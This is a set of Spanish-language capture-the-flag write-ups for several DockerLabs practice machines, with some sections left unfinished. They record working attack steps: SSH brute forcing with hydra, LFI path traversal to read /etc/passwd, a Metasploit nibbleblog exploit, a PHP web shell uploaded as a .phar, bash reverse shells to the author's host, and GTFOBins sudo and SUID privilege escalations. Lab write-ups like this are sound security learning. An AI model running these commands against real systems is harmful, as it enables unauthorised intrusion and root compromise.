# Aguademayo
Fecha: 13/08/2024

Lo primero que hago es nmap, encontrando un servidor http y ssh, ninguno con vulnerabilidades

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Miro el html de la página y encuentro un comentario con el siguiente contenido: 

```
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
```

Miro https://www.dcode.fr/es y veo varias posiblidades. Viéndolas, me tiene pinta de que es un `brainfuck`. Uso su herramienta para decodificarlo y me encuentro el siguiente mensaje: `bebeaguaqueessano` 
![](Imágenes/Pasted%20image%2020240813153408.png)

![](Imágenes/Pasted%20image%2020240813153539.png)

Ahora fuzzing de la url, y encuentro que hay existe http://172.17.0.2/images.

```
ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js -o fuzzing 
```

![](Imágenes/Pasted%20image%2020240813153735.png)

Descargo la imagen que hay e intento aplicar #esteganografía:
- Exiftool: no encuentro nada. 
- Steghid, usando como passphrase la frase encontrada anteriormente, no consigo nada. 

```
steghide --extract -sf imagen.jpg -xf steghide_extract -p bebeaguaqueessano
```

Pruebo algo más fácil: como la imagen se llama agua_ssh, intento conectarme por ssh con ese usuario. Efectivamente, entro a la máquina. 

Haciendo `sudo -l`, veo que puedo ejecutar `bettercap` como root. Lo hago, y veo que hay un comando que me deja ejecutar otros: 
![](Imágenes/Pasted%20image%2020240813155119.png)

Hago `! chmod +s /bin/bash` para setear el bit SETUID de /bin/bash. De esta forma, cuando haga sudo `/bin/bash -p` me quedaré con privilegios de root

![](Imágenes/Pasted%20image%2020240813155358.png)


# Amor
Fecha: 12/08/2024

Comienzo haciendo nmap, encontrando dos puertos abiertos con servicios no vulnerables:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```


![](Imágenes/Pasted%20image%2020240812132611.png)

Accedo a la página desde el browser, encontrando el siguiente mensaje interesante:

![](Imágenes/Pasted%20image%2020240812132801.png)

Pruebo a acceder encontrar la contraseña de carlota con hydra, usando el diccionario `rockyou.txt`, que resulta ser `babygirl` 

```
sudo hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 
```

![](Imágenes/Pasted%20image%2020240812134830.png)

Me conecto por ssh y me encuentro un fichero, que paso a mi ordenador: 

```
scp ./Desktop/fotos/vacaciones/imagen.jpg pablo@192.168.1.63:/home/pablo/dockerlabs/amor
```

Utilizo exiftool, sin encontrar nada que me parezca de valor y posteriormente steghide, encontrando el siguiente texto : `ZXNsYWNhc2FkZXBpbnlwb24=`, que tiene pinta de estar escrito en base64. Lo decodifico, encontrando el texto `eslacasadepinypon`

```
steghide --extract -sf imagen.jpg
```


![](Imágenes/Pasted%20image%2020240812235022.png)
![](Imágenes/Pasted%20image%2020240812235204.png)
Compruebo si es la contraseña de su, pero no es el caso, así que sigo buscando información. Miro si puedo escalar privilegios con `sudo -l`, sin éxito. Compruebo si hay más carpetas en /home, y encuentro una llamada `oscar`. Pruebo la contraseña con ese usuario y veo que funciona. 
![](Imágenes/Pasted%20image%2020240812235548.png)

![](Imágenes/Pasted%20image%2020240812235435.png)

Haciendo `sudo -l` en oscar veo que puedo ejecutar `ruby` como superusuario. Busco en gtfobins y encuentro lo siguiente: https://gtfobins.github.io/gtfobins/ruby/#sudo

![](Imágenes/Pasted%20image%2020240812235731.png)

![](Imágenes/Pasted%20image%2020240812235742.png)

# Anonymouspingu

Comienzo haciendo el escaneo, encontrando ftp en el puerto 21 y un apache en el 80, siendo ninguna de las dos versiones vulnerable según seachsploit. 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

```
wget -r ftp://172.17.0.2/images
```

#TODO ACABAR

# Buscalove
#LFI #FUZZING 

Fecha: 13/08/2024
Empiezo con nmap: 
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.19.0.2 -oN scan
```

Encuentro ssh en el puerto 22 y http en el 80, ninguno de ellos vulnerable. Mirando la página, solo veo la típica página de apache que indica que el servicio está funcionando, sin ningún comentario especial. Usaré fuzzing para buscar directorios. Aunque otro días usé dirbuster, leyendo comentarios sobre herramientas de este tipo, veo que se habla muy bien de **ffuf** y de **feroxbuster**, diciendo que:
- Dirb y dirbuster están anticuadas. 
- Gobuster no tiene capacidad de recursión. 
Pruebo con `feroxbuster` 

```
feroxbuster -u http://172.19.0.2 -x php -x html -x txt -x js -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o fuzzing --threads 300
```
![](Imágenes/Pasted%20image%2020240813015839.png)

Con ffuf, lo siguiente haría prácticamente lo mismo:
```
ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.19.0.2/FUZZ  -e .php,.html,.txt,.js -o fuzzing 
``` 

Haciendo `control+u` en http://172.19.0.2/wordpress encuentro el siguiente comentario: 

![](Imágenes/Pasted%20image%2020240813015744.png)

Pruebo añadiendo `/index.php` a la url y veo que no cambia la apariencia, por lo que puede que se pueda hacer path traversal (usar la url para acceder a archivos ocultos). Leyendo tutoriales, encuentro el comando que usar. El resultado será que si pongo de nombre de parámetro `love`, veré el contenido de /etc/passwd

```
ffuf -c  -u http://172.19.0.2/wordpress/index.php?FUZZ=/../../../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 183
```

-c añade color al output, haciéndolo más legible
-u es la url. FUZZ se sustituirá para buscar el nombre de un parámetro que muestre el contenido de /etc/passwd. 
-w la lista de palabras que se sustituirán por FUZZ en la url
-fw filtra las palabras de 183. Previamente, no puse el parámetro. Viendo el output, la gran mayoría (todas menos una) de las respuestas tenían 183 palabras (que es la cantidad de palabras de la página original), por lo que filtré esas opciones. 

![](Imágenes/Pasted%20image%2020240813024054.png)

Visito `http://172.19.0.2/wordpress/index.php?love=/../../../../../../../etc/passwd `

![](Imágenes/Pasted%20image%2020240813024254.png)

Encuentro dos usuarios, pedro y rosa. Probaré a usar hydra con rockyou.txt con ambos. 

```
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2 -t 64
```


![](Imágenes/Pasted%20image%2020240813025040.png)

Encuentro las credenciales de rosa, entro en la máquina y veo que tiene permisos de root para cat y ls. Miro si hay alguna forma de explotarlos para convertirse en root en https://gtfobins.github.iopero no lo encuentro, así que uso ambas herramientas para explorar el sistema de archivos: 

![](Imágenes/Pasted%20image%2020240813025546.png)

Encuentro un archivo, secret.txt, con lo que aparentemente es un código hexadecimal. El output parece un código en base 32, así que lo desencripto también 

```
echo "4E5A5857435933464F4A3247433454424F4E58584732494B" | xxd -r -p | base32 -d

noacertarasosi
```

No puedo hacer su directamente, pero si a pedro:

![](Imágenes/Pasted%20image%2020240813030757.png)

Siendo Pedro, puedo ejecutar como root /usr/bin/env, lo cual uso () para hacerme root:

![](Imágenes/Pasted%20image%2020240813030856.png)


# chocolatelovers

Fecha: 13/08/2024

Empiezo haciendo nmap, encontrando únicamente un servicio Apache en el puerto 80, que no es vulnerable según searchsploit:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Entro a la web y veo el siguiente comentario `<!-- /nibbleblog -->`, por lo que decido entrar en la url http://172.17.0.2/nibbleblog

Un texto dice que para publicar fuera a http://172.17.0.2/nibbleblog/admin.php. Intento hacer #SQLi y, aunque no consigo meterme como admin me sale el siguiente mensaje en la esquina superior izquierda. 

![](Imágenes/Pasted%20image%2020240813161059.png)

![](Imágenes/Pasted%20image%2020240813161147.png)

Pruebo con el usuario y contraseña `admin`, y cuela. 

Investigando, veo que nibbleblog es un CMS para blogs, y buscando en searchsploit veo que hay vulnerabilidades para ciertas versiones: 

![](Imágenes/Pasted%20image%2020240813162331.png)

En la parte de ajustes del dashboard, encuentro que estamos ante una versión vulnerable, por lo que usaré metasploit para explotar la vulnerabilidad: 

![](Imágenes/Pasted%20image%2020240813162405.png)

```
msfconsole -q # para  que no muestre el banner al principio
search nibbleblog
use 0
info 
set user admin
set password admin
set RHOSTS 172.17.0.2
set TARGETURI /nibbleblog

```

![](Imágenes/Pasted%20image%2020240813162746.png)

![](Imágenes/Pasted%20image%2020240813163202.png)

En principio me da un fallo, pero accedendo a la página de información de la vulnerabilidad (https://nvd.nist.gov/vuln/detail/CVE-2015-6967), veo que es porque me falta instalar el plugin myimage. 

Una vez activado de nuevo, tendremos una shell de meterpreter. Con shell crearemos una shell normal. Voy a intentar usar #nc para hacerme una reverse shell más cómoda:
```
# En mi máquina (192.168.1.63):

nc -lnvp 443

# En la shell de meterpreter: 

bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"

```

Haciendo sudo -l vemos que podemos ejecutar php como si fuera "chocolate". 

![](Imágenes/Pasted%20image%2020240813165936.png)

Buscando en gtfobins, encuentro lo siguiente: https://gtfobins.github.io/gtfobins/php/#sudo

```
CMD="/bin/sh"
sudo -u chocolate php -r "system('$CMD');"
```

![](Imágenes/Pasted%20image%2020240813170315.png)

Haciendo ps -aux, vemos que el root está ejecutando un archivo, que resulta pertenecer a `chocolate`. Por tanto, podemos escribir en él, haciendo por ejemplo que bash tenga el #SUID activado. De esta forma, nos haremos root ejecutando /bin/bash -p 
![](Imágenes/Pasted%20image%2020240813170613.png)

![](Imágenes/Pasted%20image%2020240813170916.png)

```
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```

# Consolelog
Fecha: 13/08/2024

Empiezo haciendo nmap, encontrando ssh en el puerto 5000, un framework de Nodejs en el 3000 y un apache en el 80, ninguno de ellos vulnerables por searchsploit.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Visito la página y no veo nada, solo un botón que, aparentemente, no funciona. Inspeccionando la página, veo un script, `authentication.js`, en el que dice: 
```
function autenticate() {
    console.log("Para opciones de depuracion, el token de /recurso/ es tokentraviesito");
}
```

Accedo a http://172.17.0.2/recurso/?token=tokentraviesito, y veo lo siguiente:

![](Imágenes/Pasted%20image%2020240813172916.png)

No sé qué hacer con esto, por lo que paso a hacer fuzzing de la página (con -d 2 evito demasiados niveles de recursión, ya que dentro de backend hay muchos archivos): 

```
feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 -d 2 
```

![](Imágenes/Pasted%20image%2020240813173703.png)

Mirando http://172.17.0.2/backend/server.js encuentro: 

![](Imágenes/Pasted%20image%2020240813173838.png)

Uso hydra para buscar un username que se corresponda a esa contraseña para entrar por ssh. Como se cambió el puerto al 5000: 
```
hydra -L /usr/share/wordlists/rockyou.txt  -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2:5000 -t 64
```

Encuentro el usuario `lovely`: 
![](Imágenes/Pasted%20image%2020240813175722.png)

Con sudo -l veo que puedo ejecutar nano como superusuario, por lo que haciendo lo siguiente (https://gtfobins.github.io/gtfobins/nano/#sudo) me convierto en root:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

![](Imágenes/Pasted%20image%2020240813175932.png)


# Dockerlabs
Fecha: 13/08/2024

Comienzo haciendo nmap, veo solo un apache no vulnerable en el 80.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

Hago fuzzing y encuentro varias páginas: 

```
feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -x py -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 
```

![](Imágenes/Pasted%20image%2020240813180751.png)
En http://172.17.0.2/machine.php encuentro que puedo subir archivos. Por tanto, intentaré un #LFI (Local File Inclusion). Pruebo con un txt y veo que solo me deja subir .zips. Interceptaré la petición con burpsuite para engañarle y subir algún archivo .php. Por lo que he visto en otros writeups, esto se llama `Arbitrary File Upload`


```
# Creo un php con el que podré ejecutar comandos remotas: 
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

![](Imágenes/Pasted%20image%2020240813182943.png)

En un principio esta es la petición. Voy a hacer que la máquina se piense que es un zip. Para ello, veo que hay distintas terminaciones de los archivos php: **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

Al parecer, phar es un conjunto de phps comprimidos, por lo que cuela y se sube. Ahora, podré ver ese archivo en http://172.17.0.2/uploads/script.phar y escribir los comandos que quiera:

![](Imágenes/Pasted%20image%2020240813184507.png)

![](Imágenes/Pasted%20image%2020240813184615.png)


Creo una shell que captaré desde mi máquina: 

```
# En mi máquina (192.168.1.63):

nc -lnvp 443

# En la shell de php: 

bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"

```

Y ya estoy dentro:

![](Imágenes/Pasted%20image%2020240813185112.png)

Tanto con cut como grep puedo leer archivos como si fuera superusuario. 

![](Imágenes/Pasted%20image%2020240813185352.png)

Voy mirando directorios, y encuentro que en /opt/ hay un archivo: 

![](Imágenes/Pasted%20image%2020240813185538.png)

Uso https://gtfobins.github.io/gtfobins/cut/#sudo para leer el contenido: 

```
LFILE=/opt/nota.txt
sudo cut -d "" -f1 "$LFILE"

# Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.

LFILE=/root/clave.txt
sudo cut -d "" -f1 "$LFILE"

# dockerlabsmolamogollon123

```

![](Imágenes/Pasted%20image%2020240813185747.png)


# Los 40 ladrones
Fecha: 14/08/2024

Empiezo haciendo un nmap, obteniendo un Apache no vulnerable en el puerto 80
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

No veo nada en la página, así que hago fuzzing:

```
ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing
```


Uno de los resultados es http://172.17.0.2/qdefense.txt, en el cual se ve lo siguiente:

![](Imágenes/Pasted%20image%2020240814194226.png)
Esos números y el toc-toc me hacen pensar que hay algun tipo de port knocking para activar cierto servicio, voy a probarlo: 

```
knock 172.17.0.2 7000 8000 9000
```

Al hacer nmap de nuevo, encuentro que se ha abierto el puerto 22: 
![](Imágenes/Pasted%20image%2020240814194701.png)

Me tiene pinta de que el nombre puede ser para hacer algo de OSINT, así que lo busco en el browser. No encuentro nada al respecto, así que probaré a buscar una contraseña para `tocotoc` con hydra: 

```
hydra -P /usr/share/wordlists/rockyou.txt  -l toctoc ssh://172.17.0.2 -t 64     
```

![](Imágenes/Pasted%20image%2020240814195243.png)

Encuentro la contraseña `kittycat`. Lo primero que hago es mirar `sudo -l`, y encuentro dos funciones que podría usar como root: 

![](Imágenes/Pasted%20image%2020240814195425.png)

Simplemente usando el bash tendré una terminal con permisos de superusuario: 

![](Imágenes/Pasted%20image%2020240814195533.png)


# Escolares

#TODO acabarla

Comienzo con un nmap. Hay un ssh en el 22 y un Apache en el 80, ninguno de ellos vulnerable.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.3 -oN scan
```  

Inspeccionando la página no encuentro nada, así que haré fuzzing:
```
feroxbuster -u http://172.17.0.3 -x php -x html -x txt -x js -x py -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300  
```

Encuentro varios directorios: 



